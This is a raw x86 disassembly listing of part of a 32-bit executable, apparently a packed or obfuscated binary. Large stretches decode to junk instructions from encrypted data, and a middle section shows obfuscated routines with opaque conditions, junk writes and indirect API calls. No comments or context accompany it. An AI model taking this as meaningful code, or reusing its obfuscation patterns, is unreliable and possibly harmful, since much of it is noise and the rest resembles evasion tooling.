  404ba5:	ins    DWORD PTR es:[edi],dx
  404ba6:	aam    0x73
  404ba8:	repnz mov bl,0x1
  404bab:	outs   dx,DWORD PTR ds:[esi]
  404bac:	jb     0x404c04
  404bae:	jmp    0x74c15955
  404bb3:	fist   WORD PTR [ebp-0x564d0d0]
  404bb9:	mov    bl,0x76
  404bbb:	or     edx,DWORD PTR [edx]
  404bbd:	mov    BYTE PTR [edi],ch
  404bbf:	call   0xa998:0x1cb27942
  404bc6:	jo     0x404bdd
  404bc8:	jnp    0x404c10
  404bca:	retf   
  404bcb:	cwde   
  404bcc:	and    al,0xda
  404bce:	dec    esp
  404bcf:	inc    edx
  404bd0:	add    ah,BYTE PTR [edx]
  404bd2:	out    0x16,eax
  404bd4:	outs   dx,BYTE PTR ds:[esi]
  404bd5:	test   BYTE PTR [ebp-0x45],dh
  404bd8:	in     al,dx
  404bd9:	int    0xf6
  404bdb:	xchg   esi,eax
  404bdc:	inc    eax
  404bdd:	jmp    0xe068:0x84d98d63
  404be4:	pop    es
  404be5:	inc    DWORD PTR ds:0x59be087
  404beb:	pop    eax
  404bec:	sub    eax,0x1741afba
  404bf1:	adc    DWORD PTR [edi-0x6de68282],edx
  404bf7:	pop    ss
  404bf8:	add    BYTE PTR [eax+edi*8],ah
  404bfb:	ja     0x404c07
  404bfd:	and    eax,0x29a3a3a
  404c02:	or     DWORD PTR [esi],esi
  404c04:	mov    bh,0xcc
  404c06:	add    al,0x16
  404c08:	adc    al,ah
  404c0a:	push   ebx
  404c0b:	fcomip st,st(4)
  404c0d:	sti    
  404c0e:	xchg   edi,eax
  404c0f:	icebp  
  404c10:	push   ebp
  404c11:	frstor [edi]
  404c13:	and    bh,BYTE PTR [ecx]
  404c15:	mov    al,0x87
  404c17:	cmp    BYTE PTR [edi-0x6f34bab0],ah
  404c1d:	int    0x1d
  404c1f:	mov    al,ds:0xcdc69667
  404c24:	mov    eax,ds:0xa355d52
  404c29:	or     BYTE PTR [eax-0x27bdb8ab],dh
  404c2f:	pushf  
  404c30:	loope  0x404c45
  404c32:	push   edx
  404c33:	xchg   BYTE PTR [ebx+0x37],cl
  404c36:	or     bh,ah
  404c38:	mov    esp,DWORD PTR [eax-0x5]
  404c3b:	cli    
  404c3c:	mov    eax,ds:0x11e6205
  404c41:	outs   dx,DWORD PTR ds:[esi]
  404c42:	daa    
  404c43:	fisttp WORD PTR [edx]
  404c45:	jnp    0x404c03
  404c47:	in     al,0x99
  404c49:	mov    BYTE PTR [edi+0x2dc14538],bh
  404c4f:	sub    dl,BYTE PTR [esi+ecx*8]
  404c52:	mov    ebp,0xae522e0c
  404c57:	or     BYTE PTR [ebx],ch
  404c59:	aad    0x18
  404c5b:	jl     0x404be5
  404c5d:	mov    edi,0x6cfe11f8
  404c62:	(bad)  
  404c63:	scas   al,BYTE PTR es:[edi]
  404c64:	push   0xd9d32479
  404c69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c6a:	jns    0x404c04
  404c6c:	mov    al,0x83
  404c6e:	cdq    
  404c6f:	aam    0x78
  404c71:	mov    ecx,0x7ace80f
  404c76:	pop    ebp
  404c77:	ins    BYTE PTR es:[edi],dx
  404c78:	jle    0x404cc4
  404c7a:	loop   0x404cf0
  404c7c:	test   BYTE PTR [eax-0x34],cl
  404c7f:	stos   BYTE PTR es:[edi],al
  404c80:	call   0x7ca0:0x7cf12aa0
  404c87:	and    ah,BYTE PTR [ebx+ebp*2-0x1306c838]
  404c8e:	ds in  eax,dx
  404c90:	push   ss
  404c91:	dec    edi
  404c92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c93:	imul   eax,DWORD PTR [edx+0x543af998],0x2
  404c9a:	cli    
  404c9b:	call   0xc933da5f
  404ca0:	jecxz  0x404c4c
  404ca2:	nop
  404ca3:	mov    bl,BYTE PTR [edx+0x795f8d21]
  404ca9:	add    bl,BYTE PTR [ebx*1-0x3a7b982d]
  404cb0:	enter  0x305b,0xac
  404cb4:	and    eax,edi
  404cb6:	mov    bh,0xb8
  404cb8:	dec    edi
  404cb9:	xchg   edx,eax
  404cba:	cmp    DWORD PTR [ebp-0x64],eax
  404cbd:	add    esi,ebp
  404cbf:	fwait
  404cc0:	out    dx,al
  404cc1:	jbe    0x404c60
  404cc3:	retf   
  404cc4:	lods   eax,DWORD PTR ds:[esi]
  404cc5:	or     al,bh
  404cc7:	push   0x55
  404cc9:	lahf   
  404cca:	push   esp
  404ccb:	xchg   esp,eax
  404ccc:	mov    DWORD PTR [edi-0x57],ebp
  404ccf:	fs and al,0x70
  404cd2:	xchg   esp,eax
  404cd3:	and    DWORD PTR [esi+0x174ae625],0x57a85607
  404cdd:	xor    bh,BYTE PTR [esi-0x3ad809ea]
  404ce3:	dec    edx
  404ce4:	cmp    esi,esi
  404ce6:	and    DWORD PTR [ebp+0x37e5a059],esp
  404cec:	(bad)  
  404ced:	push   esp
  404cee:	fwait
  404cef:	sub    eax,DWORD PTR [ebx-0x34]
  404cf2:	jecxz  0x404cd4
  404cf4:	pop    ebx
  404cf5:	imul   eax,DWORD PTR [ecx-0x180e3856],0xe73468ce
  404cff:	or     BYTE PTR [edi+0x3995d402],cl
  404d05:	push   0xfa5de019
  404d0a:	fadd   DWORD PTR [ecx]
  404d0c:	push   es
  404d0d:	dec    ebp
  404d0e:	cmp    eax,0x8e6225cd
  404d13:	stc    
  404d14:	mov    ds:0xee1f1304,eax
  404d19:	test   DWORD PTR [ebx],0xfa73510f
  404d1f:	xchg   edi,eax
  404d20:	in     eax,0x9f
  404d22:	xor    al,0x3c
  404d24:	lods   al,BYTE PTR ds:[esi]
  404d25:	adc    bl,BYTE PTR [ebp-0x58b9a90f]
  404d2b:	rcr    edi,1
  404d2d:	push   eax
  404d2e:	fld    DWORD PTR [ecx+0x8]
  404d31:	aad    0xcb
  404d33:	(bad)  [esi]
  404d35:	stos   BYTE PTR es:[edi],al
  404d36:	ins    DWORD PTR es:[edi],dx
  404d37:	pop    gs
  404d39:	xor    DWORD PTR [eax+edx*1+0x1a],ecx
  404d3d:	sub    DWORD PTR [ecx+edi*1],ebx
  404d40:	fcmovu st,st(1)
  404d42:	or     ebx,0xfffffff7
  404d45:	push   esp
  404d46:	out    dx,eax
  404d47:	push   eax
  404d48:	adc    eax,0x42f99a32
  404d4d:	adc    DWORD PTR [esi],edx
  404d4f:	and    BYTE PTR [ecx-0x28],bh
  404d52:	shl    dh,cl
  404d54:	fdivr  st(6),st
  404d56:	jmp    0xa46580e8
  404d5b:	pushf  
  404d5c:	mov    al,ds:0x2fff9cc1
  404d61:	(bad)  
  404d63:	pop    eax
  404d64:	imul   ebp,DWORD PTR [edx+0x6026d06d],0xba5fd8ce
  404d6e:	sub    DWORD PTR [ecx],esp
  404d70:	mov    esp,0xf2d1938f
  404d75:	aas    
  404d76:	sbb    al,0x29
  404d78:	pop    es
  404d79:	push   es
  404d7a:	mov    esi,0x82216406
  404d7f:	daa    
  404d80:	aad    0xf8
  404d82:	int    0x11
  404d84:	sbb    ecx,0xfffffff6
  404d87:	ss daa 
  404d89:	sbb    al,0xb6
  404d8b:	xchg   DWORD PTR [edx],ebp
  404d8d:	popa   
  404d8e:	pop    edx
  404d8f:	or     eax,0xd72b912f
  404d94:	or     ah,dl
  404d96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d97:	or     BYTE PTR [eax],cl
  404d99:	cmp    esp,edx
  404d9b:	xchg   edx,eax
  404d9c:	xor    al,0x70
  404d9e:	sahf   
  404d9f:	mov    eax,0x7a7c0e4b
  404da4:	sbb    DWORD PTR [ecx-0x209bd5c],0x2
  404dab:	xchg   edx,eax
  404dac:	sub    dl,BYTE PTR [edx-0x28]
  404daf:	outs   dx,DWORD PTR ds:[esi]
  404db0:	aas    
  404db1:	clc    
  404db2:	repz repz mov esp,0xfb0bb079
  404db9:	xor    ah,ah
  404dbb:	xchg   edi,eax
  404dbc:	inc    ecx
  404dbd:	out    dx,eax
  404dbe:	outs   dx,BYTE PTR ds:[esi]
  404dbf:	dec    ebp
  404dc0:	xor    al,0xbf
  404dc2:	sbb    ebp,DWORD PTR [edi-0x14]
  404dc5:	es pop esi
  404dc7:	dec    ecx
  404dc8:	inc    esi
  404dc9:	mov    ebx,0xca0bd656
  404dce:	dec    edx
  404dcf:	scas   al,BYTE PTR es:[edi]
  404dd0:	rol    BYTE PTR [ebx+0x6c],cl
  404dd3:	push   edi
  404dd4:	les    ecx,FWORD PTR [esp+eiz*2-0x78c23279]
  404ddb:	dec    ebx
  404ddc:	repz enter 0xd0c1,0x51
  404de1:	es cdq 
  404de3:	mov    edi,0x27c73a31
  404de8:	lods   eax,DWORD PTR ds:[esi]
  404de9:	inc    ecx
  404dea:	mov    BYTE PTR [eax-0x64293d02],al
  404df0:	sub    eax,0x78181587
  404df5:	sub    edx,esi
  404df7:	adc    BYTE PTR [ecx+0x143483dc],ch
  404dfd:	jp     0x404dc9
  404dff:	push   edi
  404e00:	sbb    edi,ebx
  404e02:	jo     0x404e5c
  404e04:	daa    
  404e05:	ror    DWORD PTR [eax+0x56],1
  404e08:	shl    DWORD PTR [eax-0x3fd21f81],cl
  404e0e:	jg     0x404dc5
  404e10:	hlt    
  404e11:	js     0x404dd3
  404e13:	lock lahf 
  404e15:	mov    ecx,0x78a29b60
  404e1a:	cmp    esi,DWORD PTR [edi+ebp*2-0x48]
  404e1e:	fwait
  404e1f:	mov    eax,0x44175f8e
  404e24:	or     al,0x64
  404e26:	aad    0xec
  404e28:	pop    esi
  404e29:	adc    cl,ch
  404e2b:	and    dl,BYTE PTR [ebp-0x4705ad60]
  404e31:	sbb    eax,0x5b
  404e34:	(bad)  
  404e35:	icebp  
  404e36:	xor    eax,0xaebd5301
  404e3b:	mov    cl,0xaa
  404e3d:	mov    DWORD PTR [ecx-0x5a],ebx
  404e40:	inc    edx
  404e41:	pop    ebp
  404e42:	add    ecx,ecx
  404e44:	retf   0xdd80
  404e47:	aaa    
  404e48:	(bad)  
  404e49:	rcl    BYTE PTR [ecx],1
  404e4b:	jne    0x404e67
  404e4d:	mov    al,0x31
  404e4f:	shr    DWORD PTR [edi-0x16],cl
  404e52:	outs   dx,BYTE PTR ds:[esi]
  404e53:	and    bl,BYTE PTR [ebx+eax*4-0x62cc082b]
  404e5a:	aaa    
  404e5b:	sub    BYTE PTR [eax+0x380c6325],ch
  404e61:	inc    esi
  404e62:	or     al,ah
  404e64:	hlt    
  404e65:	mov    bl,ah
  404e67:	ds pop ebx
  404e69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e6a:	clc    
  404e6b:	repz sub ebx,ebx
  404e6e:	inc    ebp
  404e6f:	pop    ecx
  404e70:	add    ebx,DWORD PTR [eax+0x5d]
  404e73:	punpcklbw mm1,mm1
  404e76:	cmp    ecx,DWORD PTR [eax+0x10]
  404e79:	adc    eax,0x10d4c1c1
  404e7e:	retf   0xc9b2
  404e81:	mul    BYTE PTR [eax]
  404e83:	cwde   
  404e84:	add    DWORD PTR [edi+0x4de8281e],esp
  404e8a:	call   0x96b5:0xc6c52263
  404e91:	xchg   edx,eax
  404e92:	jmp    0xc56cde9e
  404e97:	sub    bh,ah
  404e99:	sar    BYTE PTR [esi+edx*4-0x73bfb8a6],0x25
  404ea1:	(bad)  
  404ea2:	cmp    edi,esi
  404ea4:	fmul   QWORD PTR [ebp-0x5585c868]
  404eaa:	in     eax,0xe5
  404eac:	jmp    0xe123:0xfa9ed881
  404eb3:	mov    ch,0x18
  404eb5:	shl    BYTE PTR [ebx-0x3bf9f75a],1
  404ebb:	dec    ebx
  404ebc:	cmp    al,ch
  404ebe:	push   ss
  404ebf:	xchg   ecx,ebp
  404ec1:	inc    al
  404ec3:	and    al,0x0
  404ec5:	stos   BYTE PTR es:[edi],al
  404ec6:	in     al,dx
  404ec7:	xor    al,0x4b
  404ec9:	sti    
  404eca:	ins    BYTE PTR es:[edi],dx
  404ecb:	sar    ebx,cl
  404ecd:	ds shr ecx,cl
  404ed0:	mov    bh,0x1d
  404ed2:	(bad)  
  404ed3:	jmp    0xb659a339
  404ed8:	lods   eax,DWORD PTR ds:[esi]
  404ed9:	sbb    al,0x6f
  404edb:	push   esp
  404edc:	push   0x39c175b3
  404ee1:	push   0xffffffdd
  404ee3:	push   cs
  404ee4:	or     eax,0xbf482ed1
  404ee9:	aam    0xa8
  404eeb:	mov    ch,0xc8
  404eed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404eee:	sub    edx,DWORD PTR [edi+0x8]
  404ef1:	lock sbb BYTE PTR [edi],bh
  404ef4:	push   ds
  404ef5:	push   ds
  404ef6:	jno    0x404f03
  404ef8:	cmp    eax,0x3f31f3ea
  404efd:	and    al,BYTE PTR [edx]
  404eff:	adc    cl,BYTE PTR [edi-0x7bc779c8]
  404f05:	cli    
  404f06:	xchg   ebx,eax
  404f07:	inc    ecx
  404f08:	popf   
  404f09:	mov    ecx,0xfbf27b89
  404f0e:	fsubr  QWORD PTR [edi-0x51a45a69]
  404f14:	out    0x55,eax
  404f16:	enter  0x44f7,0xd9
  404f1a:	add    BYTE PTR [esi-0x1dff38be],bh
  404f20:	jnp    0x404eff
  404f22:	jp     0x404fa3
  404f24:	stos   BYTE PTR es:[edi],al
  404f25:	inc    ebp
  404f26:	push   ecx
  404f27:	dec    esi
  404f28:	lods   eax,DWORD PTR ds:[esi]
  404f29:	call   0x81e4:0x550b8be4
  404f30:	sbb    eax,0x4282bb
  404f35:	push   esi
  404f36:	je     0x404f38
  404f38:	add    cl,al
  404f3a:	loope  0x404f5a
  404f3c:	lea    ecx,[edx+eax*1]
  404f3f:	adc    edx,DWORD PTR ds:0x4282c7
  404f45:	mov    eax,DWORD PTR [ebx]
  404f47:	or     DWORD PTR ds:0x4283db,edi
  404f4d:	mov    edx,DWORD PTR [ebx+0x4]
  404f50:	mov    DWORD PTR ds:0x4283b7,0x1480
  404f5a:	shrd   eax,edx,0x2
  404f5e:	adc    DWORD PTR ds:0x4283c3,0x1a3a
  404f68:	shr    edx,0x2
  404f6b:	cmp    DWORD PTR ds:0x4283c3,0x0
  404f72:	mov    DWORD PTR ds:0x428353,ebx
  404f78:	mov    DWORD PTR ds:0x4283cb,0x56b3
  404f82:	mov    DWORD PTR ds:0x4282ab,0x1c7d
  404f8c:	jmp    0x405004
  404f91:	mov    DWORD PTR ds:0x42827f,ebx
  404f97:	mov    DWORD PTR ds:0x4282b7,0x5683
  404fa1:	cmp    DWORD PTR ds:0x4283c3,0x0
  404fa8:	jg     0x404fd2
  404fae:	push   0x428f
  404fb3:	push   DWORD PTR [ebp-0x14]
  404fb6:	call   DWORD PTR ds:0x428dcc
  404fbc:	and    edx,DWORD PTR ds:0x428363
  404fc2:	sub    DWORD PTR ds:0x42828f,ecx
  404fc8:	or     DWORD PTR ds:0x428283,0xf0b
  404fd2:	adc    DWORD PTR ds:0x4281bf,0x4903
  404fdc:	mov    edx,DWORD PTR ds:0x4283a3
  404fe2:	mov    edx,DWORD PTR [edx]
  404fe4:	add    DWORD PTR ds:0x4281ab,edx
  404fea:	xor    edx,edx
  404fec:	xor    edx,DWORD PTR ds:0x4281a3
  404ff2:	xor    DWORD PTR ds:0x4282e3,edx
  404ff8:	mov    edx,DWORD PTR ds:0x4282b7
  404ffe:	add    DWORD PTR ds:0x4283db,edx
  405004:	mov    DWORD PTR [ebp-0x1c],eax
  405007:	mov    eax,ds:0x4282e3
  40500c:	add    DWORD PTR ds:0x4282bb,eax
  405012:	mov    eax,DWORD PTR [ebx]
  405014:	sub    edx,0x532
  40501a:	mov    edx,DWORD PTR [ebx+0x4]
  40501d:	xor    DWORD PTR [ebp-0x1c],edi
  405020:	mov    edx,eax
  405022:	xor    eax,eax
  405024:	add    DWORD PTR ds:0x4283c3,0x32cc
  40502e:	or     eax,DWORD PTR [ebp-0x1c]
  405031:	sub    DWORD PTR ds:0x4283cf,0x1679
  40503b:	shl    edx,0x1e
  40503e:	and    DWORD PTR ds:0x4281b7,edi
  405044:	imul   eax,ecx
  405047:	mov    ecx,DWORD PTR [ebx]
  405049:	mov    edx,DWORD PTR [ebx+0x4]
  40504c:	shrd   ecx,edx,0x2
  405050:	sbb    DWORD PTR ds:0x4283df,0x5de1
  40505a:	mov    DWORD PTR [ebp-0x1c],ecx
  40505d:	sbb    DWORD PTR ds:0x4282cf,0x3a7c
  405067:	mov    ecx,DWORD PTR [ebx]
  405069:	adc    DWORD PTR ds:0x4281c3,0x4282a7
  405073:	xor    DWORD PTR [ebp-0x1c],edi
  405076:	shr    edx,0x2
  405079:	adc    DWORD PTR ds:0x4283bb,ecx
  40507f:	mov    edx,DWORD PTR [ebx+0x4]
  405082:	mov    edx,ecx
  405084:	xor    ecx,ecx
  405086:	mov    DWORD PTR ds:0x4283cb,0x321a
  405090:	or     ecx,DWORD PTR [ebp-0x1c]
  405093:	adc    DWORD PTR ds:0x4282bb,0x4283c7
  40509d:	shl    edx,0x1e
  4050a0:	or     DWORD PTR ds:0x4282b3,0x4282d3
  4050aa:	sub    ecx,eax
  4050ac:	mov    eax,DWORD PTR [ebp-0xc]
  4050af:	mov    DWORD PTR ds:0x428287,0x7aa6
  4050b9:	cmp    DWORD PTR [eax],ecx
  4050bb:	not    eax
  4050bd:	mov    eax,DWORD PTR [ebp-0xc]
  4050c0:	mov    DWORD PTR ds:0x4283bb,0x460d
  4050ca:	jg     0x405287
  4050d0:	mov    ecx,DWORD PTR [ebp+0x18]
  4050d3:	xor    DWORD PTR ds:0x4283cb,edx
  4050d9:	mov    edx,DWORD PTR [ebp+0x1c]
  4050dc:	sbb    DWORD PTR ds:0x4283d7,0x42827b
  4050e6:	shrd   ecx,edx,0x2
  4050ea:	sbb    DWORD PTR ds:0x4282a3,0x42828f
  4050f4:	mov    DWORD PTR [ebp-0x1c],ecx
  4050f7:	mov    ecx,DWORD PTR [ebp+0x18]
  4050fa:	xor    DWORD PTR [ebp-0x1c],edi
  4050fd:	or     DWORD PTR ds:0x4282df,0x2ce0
  405107:	shl    ecx,0x1e
  40510a:	xor    ecx,ecx
  40510c:	and    DWORD PTR ds:0x4282bf,0x42829b
  405116:	or     ecx,DWORD PTR [ebp-0x1c]
  405119:	shr    edx,0x2
  40511c:	or     DWORD PTR ds:0x4281a7,ebx
  405122:	mov    edx,DWORD PTR [ebp+0x1c]
  405125:	mov    DWORD PTR [ebp-0x2c],ecx
  405128:	cmp    DWORD PTR ds:0x4283cb,0x0
  40512f:	mov    DWORD PTR ds:0x4281db,edx
  405135:	mov    DWORD PTR ds:0x4283ab,ecx
  40513b:	not    edx
  40513d:	jmp    0x405212
  405142:	mov    DWORD PTR ds:0x4281bb,0x795c
  40514c:	cmp    DWORD PTR ds:0x4283cb,0x0
  405153:	ja     0x40517c
  405159:	push   0x427fec
  40515e:	push   DWORD PTR [ebp-0x24]
  405161:	push   0x6923
  405166:	call   DWORD PTR ds:0x428df4
  40516c:	or     DWORD PTR ds:0x4282b3,0xa87
  405176:	add    ecx,DWORD PTR ds:0x4283e7
  40517c:	adc    ecx,DWORD PTR ds:0x4281cb
  405182:	xor    DWORD PTR ds:0x4281bb,0x1a4f
  40518c:	sbb    DWORD PTR ds:0x4282cf,edx
  405192:	cmp    DWORD PTR ds:0x42832b,0x0
  405199:	mov    DWORD PTR ds:0x428357,0x66a6
  4051a3:	mov    DWORD PTR ds:0x428337,ecx
  4051a9:	mov    ecx,0x67a4
  4051ae:	jmp    0x405212
  4051b3:	mov    edx,0x2152
  4051b8:	cmp    DWORD PTR ds:0x42832b,0x0
  4051bf:	jge    0x4051e9
  4051c5:	push   DWORD PTR [ebp-0x28]
  4051c8:	push   DWORD PTR [ebp-0x28]
  4051cb:	call   DWORD PTR ds:0x428df8
  4051d1:	inc    DWORD PTR ds:0x4282c7
  4051d7:	mov    ecx,DWORD PTR ds:0x428207
  4051dd:	mov    edx,DWORD PTR ds:0x428407
  4051e3:	sub    ecx,edx
  4051e5:	imul   ecx,DWORD PTR [ecx+edx*1]
  4051e9:	xor    DWORD PTR ds:0x42832b,0x4a74
  4051f3:	mov    edx,DWORD PTR ds:0x4281ff
  4051f9:	mov    edx,DWORD PTR [edx]
  4051fb:	sub    DWORD PTR ds:0x4282b3,edx
  405201:	mov    edx,DWORD PTR ds:0x428217
  405207:	mov    ecx,DWORD PTR ds:0x428407
  40520d:	sub    ecx,edx
  40520f:	and    edx,DWORD PTR [edx+ecx*1]
  405212:	mov    ecx,DWORD PTR [ebx]
  405214:	sub    DWORD PTR ds:0x4283bf,0x2089
  40521e:	mov    edx,DWORD PTR [ebx+0x4]
  405221:	shrd   ecx,edx,0x2
  405225:	shr    edx,0x2
  405228:	mov    DWORD PTR [ebp-0x1c],ecx
  40522b:	xor    edx,edx
  40522d:	xor    edx,DWORD PTR ds:0x4282cf
  405233:	sub    DWORD PTR ds:0x4281d3,edx
  405239:	mov    ecx,DWORD PTR [ebx]
  40523b:	inc    edx
  40523c:	mov    edx,DWORD PTR [ebx+0x4]
  40523f:	add    DWORD PTR ds:0x4283ab,0x35fe
  405249:	xor    DWORD PTR [ebp-0x1c],edi
  40524c:	xor    edx,edx
  40524e:	xor    DWORD PTR ds:0x4281b7,0x631d
  405258:	or     edx,DWORD PTR [ebp-0x1c]
  40525b:	xor    DWORD PTR ds:0x4282bf,0x4281c3
  405265:	shl    ecx,0x1e
  405268:	and    DWORD PTR ds:0x4283db,0x4282a7
  405272:	imul   edx,DWORD PTR [ebp-0x2c]
  405276:	add    DWORD PTR ds:0x4283d3,0x4996
  405280:	sub    DWORD PTR [eax],edx
  405282:	jmp    0x4058d5
  405287:	add    DWORD PTR ds:0x4281ab,0x42f2
  405291:	mov    ecx,DWORD PTR [esi]
  405293:	cmp    DWORD PTR ds:0x4282e3,0x0
  40529a:	mov    DWORD PTR ds:0x428273,0x7c0
  4052a4:	mov    edx,DWORD PTR ds:0x4282b3
  4052aa:	mov    DWORD PTR ds:0x42833b,0x4c43
  4052b4:	jmp    0x405321
  4052b9:	mov    DWORD PTR ds:0x4283e3,0x6b40
  4052c3:	mov    DWORD PTR ds:0x4282cb,0x2bfd
  4052cd:	cmp    DWORD PTR ds:0x4282e3,0x0
  4052d4:	jae    0x4052fc
  4052da:	push   0x4280a9
  4052df:	push   0x1ca9
  4052e4:	call   DWORD PTR ds:0x428dfc
  4052ea:	add    edx,DWORD PTR ds:0x42829b
  4052f0:	adc    edx,0x1702
  4052f6:	add    edx,DWORD PTR ds:0x4281c3
  4052fc:	and    DWORD PTR ds:0x4281cf,0x3bee
  405306:	dec    edx
  405307:	xor    edx,edx
  405309:	or     edx,DWORD PTR ds:0x4282a7
  40530f:	add    DWORD PTR ds:0x4282e3,edx
  405315:	mov    edx,DWORD PTR ds:0x4282cb
  40531b:	add    DWORD PTR ds:0x4281b3,edx
  405321:	mov    edx,DWORD PTR [esi+0x4]
  405324:	xor    DWORD PTR ds:0x428337,0x42826f
  40532e:	shrd   ecx,edx,0x2
  405332:	mov    DWORD PTR [ebp-0x1c],ecx
  405335:	cmp    DWORD PTR ds:0x428353,0x0
  40533c:	mov    DWORD PTR ds:0x42834f,edi
  405342:	mov    DWORD PTR ds:0x4282b7,ebx
  405348:	jmp    0x405426
  40534d:	mov    DWORD PTR ds:0x42835b,0x4d36
  405357:	mov    DWORD PTR ds:0x4283d7,0x1e95
  405361:	cmp    DWORD PTR ds:0x428353,0x0
  405368:	jb     0x405396
  40536e:	push   0x848f
  405373:	push   0x5d21
  405378:	call   DWORD PTR ds:0x428e00
  40537e:	not    ecx
  405380:	adc    DWORD PTR ds:0x4283df,ecx
  405386:	neg    ecx
  405388:	mov    ecx,DWORD PTR ds:0x42841f
  40538e:	mov    ecx,DWORD PTR [ecx]
  405390:	sub    DWORD PTR ds:0x4283bf,ecx
  405396:	mov    ecx,DWORD PTR ds:0x42828f
  40539c:	xor    DWORD PTR ds:0x42819b,ecx
  4053a2:	or     ecx,0x48b0
  4053a8:	sbb    DWORD PTR ds:0x4282bb,edx
  4053ae:	cmp    DWORD PTR ds:0x42833b,0x0
  4053b5:	mov    DWORD PTR ds:0x4281a7,edi
  4053bb:	not    DWORD PTR ds:0x42827b
  4053c1:	jmp    0x405426
  4053c6:	mov    DWORD PTR ds:0x4281d7,0xab0
  4053d0:	cmp    DWORD PTR ds:0x42833b,0x0
  4053d7:	jb     0x405406
  4053dd:	push   0x56df
  4053e2:	push   DWORD PTR [ebp-0x20]
  4053e5:	push   DWORD PTR [ebp-0x20]
  4053e8:	push   0x14ed
  4053ed:	push   DWORD PTR [ebp-0x24]
  4053f0:	call   DWORD PTR ds:0x428e04
  4053f6:	sub    ecx,DWORD PTR ds:0x4281db
  4053fc:	sub    DWORD PTR ds:0x42827b,0x6432
  405406:	or     DWORD PTR ds:0x42829f,0x3285
  405410:	adc    ecx,DWORD PTR ds:0x4281cf
  405416:	sub    DWORD PTR ds:0x4283d3,edi
  40541c:	mov    DWORD PTR ds:0x42827b,0x48f2
  405426:	mov    ecx,DWORD PTR [esi]
  405428:	xor    DWORD PTR [ebp-0x1c],edi
  40542b:	shl    ecx,0x1e
  40542e:	adc    DWORD PTR ds:0x4282b7,0xf0c
  405438:	xor    ecx,ecx
  40543a:	xor    DWORD PTR ds:0x42832f,0x1337
  405444:	or     ecx,DWORD PTR [ebp-0x1c]
  405447:	shr    edx,0x2
  40544a:	mov    edx,DWORD PTR ds:0x4283df
  405450:	sub    edx,DWORD PTR ds:0x428193
  405456:	mov    DWORD PTR ds:0x4283df,edx
  40545c:	jmp    0x40583a
  405461:	xchg   ecx,eax
  405462:	stc    
  405463:	xchg   ebp,eax
  405464:	out    dx,al
  405465:	ins    BYTE PTR es:[edi],dx
  405466:	push   0x6b
  405468:	jbe    0x405493
  40546a:	push   0x25
  40546c:	stos   BYTE PTR es:[edi],al
  40546d:	inc    esi
  40546e:	xchg   edx,eax
  40546f:	jno    0x405421
  405471:	out    0xb9,al
  405473:	sbb    BYTE PTR [eax],bl
  405475:	sahf   
  405476:	adc    bl,BYTE PTR [eax]
  405478:	sbb    BYTE PTR [eax],cl
  40547a:	imul   DWORD PTR [edi+0x2f]
  40547d:	fwait
  40547e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40547f:	cwde   
  405480:	cld    
  405481:	std    
  405482:	sub    eax,0x4ebdc04
  405487:	sub    BYTE PTR [edx+0x20fbe86f],al
  40548d:	xchg   ebp,eax
  40548e:	pop    DWORD PTR [edi+0x27]
  405491:	pop    ds
  405492:	pop    ebx
  405493:	int    0x19
  405495:	sbb    ecx,DWORD PTR [eax+0x60d478]
  40549b:	xchg   ebx,eax
  40549c:	mov    dl,0x7f
  40549e:	fs jb  0x405464
  4054a1:	stos   BYTE PTR es:[edi],al
  4054a2:	fstp   TBYTE PTR [edx+0x5c145daa]
  4054a9:	adc    al,0xd5
  4054ab:	xchg   DWORD PTR [ecx],eax
  4054ad:	popa   
  4054ae:	lahf   
  4054af:	(bad)  
  4054b0:	dec    ebx
  4054b1:	jno    0x4054f1
  4054b3:	dec    eax
  4054b4:	nop
  4054b5:	inc    DWORD PTR [ebx-0x4]
  4054b8:	push   ds
  4054b9:	mov    ds:0xb5ad2e2d,al
  4054be:	jg     0x40546c
  4054c0:	repnz imul DWORD PTR [ecx+eax*1+0x35]
  4054c5:	sbb    BYTE PTR [esi-0x42],ah
  4054c8:	outs   dx,BYTE PTR ds:[esi]
  4054c9:	sti    
  4054ca:	lods   al,BYTE PTR ds:[esi]
  4054cb:	unpckhps xmm5,xmm3
  4054ce:	jle    0x405517
  4054d0:	push   edi
  4054d1:	cmp    DWORD PTR [eax+0x4ec44b07],0xc7466a18
  4054db:	loop   0x4054fc
  4054dd:	rcl    DWORD PTR [esi-0x447aac49],1
  4054e3:	push   edx
  4054e4:	scas   eax,DWORD PTR es:[edi]
  4054e5:	ss imul eax,ebp,0xffffff96
  4054e9:	mov    ss,WORD PTR [ebp+edx*8+0x781c229b]
  4054f0:	add    ebx,DWORD PTR [esi-0x3c338560]
  4054f6:	pop    edi
  4054f7:	scas   al,BYTE PTR es:[edi]
  4054f8:	inc    ebp
  4054f9:	mov    ebx,0x775f978a
  4054fe:	repnz mov dl,0x5b
  405501:	shl    DWORD PTR [edx-0x2b13b7bf],0x3b
  405508:	jmp    0x208548d0
  40550d:	pop    ebx
  40550e:	fisttp QWORD PTR [edi-0x78]
  405511:	(bad)  
  405512:	loopne 0x4054ca
  405514:	sbb    edi,DWORD PTR [ebp+0x10a7cc98]
  40551a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40551b:	fwait
  40551c:	dec    edi
  40551d:	(bad)  [eax+0x37d669d3]
  405523:	cdq    
  405524:	gs or  cl,cl
  405527:	inc    ebp
  405528:	test   bl,ah
  40552a:	call   0x6b5aaf93
  40552f:	fld    DWORD PTR [edi-0x40]
  405532:	cli    
  405533:	push   eax
  405534:	and    ch,al
  405536:	dec    edi
  405537:	pushf  
  405538:	mov    bl,0xef
  40553a:	adc    eax,esp
  40553c:	ss inc esp
  40553e:	scas   eax,DWORD PTR es:[edi]
  40553f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405540:	out    0xed,al
  405542:	push   ebp
  405543:	push   esi
  405544:	scas   eax,DWORD PTR es:[edi]
  405545:	or     eax,0xf0647bef
  40554a:	add    dh,ah
  40554c:	inc    eax
  40554d:	adc    al,0x92
  40554f:	xchg   ecx,eax
  405550:	fcmove st,st(6)
  405552:	jo     0x405597
  405554:	or     al,0x37
  405556:	pop    ds
  405557:	xchg   ebx,eax
  405558:	(bad)  
  40555a:	ret    
  40555b:	jne    0x405517
  40555d:	loop   0x4055c4
